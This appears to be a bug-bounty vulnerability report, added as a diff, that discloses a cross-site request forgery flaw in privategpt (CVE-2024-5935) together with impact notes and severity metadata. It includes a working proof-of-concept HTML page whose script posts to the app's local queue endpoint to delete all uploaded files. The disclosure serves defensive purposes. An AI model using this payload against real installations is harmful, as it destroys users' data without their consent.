@@ -1,0 +1,57 @@
+Title: CSRF on delete all files. in imartinez/privategpt
+
+Proof of Concept: 
+Just create index.html and paste the following:
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XHR POST Request</title>
+</head>
+<body>
+  <script>
+    var xhr = new XMLHttpRequest();
+    var url = 'http://localhost:8001/queue/join';
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        console.log(xhr.responseText);
+      }
+    };
+    var data = JSON.stringify({
+      "data": [],
+      "event_data": null,
+      "fn_index": 5,
+      "trigger_id": 11,
+      "session_hash": "dsakjdsal"
+    });
+    xhr.send(data);
+  </script>
+</body>
+</html>
+
+Impact: 
+Data Loss: If the targeted application is responsible for managing important data, such as uploaded files, the CSRF attack could result in the unauthorized deletion or modification of this data. In this case, the attack specifically aims to delete all uploaded files on the server, causing data loss for the application's users.
+Service Disruption: Deleting all uploaded files can lead to service disruption for the application's users. For example, if the files are essential for the application's functionality or if they contain critical information for users, their sudden removal could render the application unusable or significantly impair its functionality.
+
+CVE ID: CVE-2024-5935
+Status: (published)
+Vulnerability Type: CWE-352: Cross-Site Request Forgery (CSRF)
+Severity: Medium (5.4)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: None
+Integrity: Low
+Availability: Low
+Registry: Other
+Affected Version: 0.5.0
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125
+Fix Bounty: $31.25
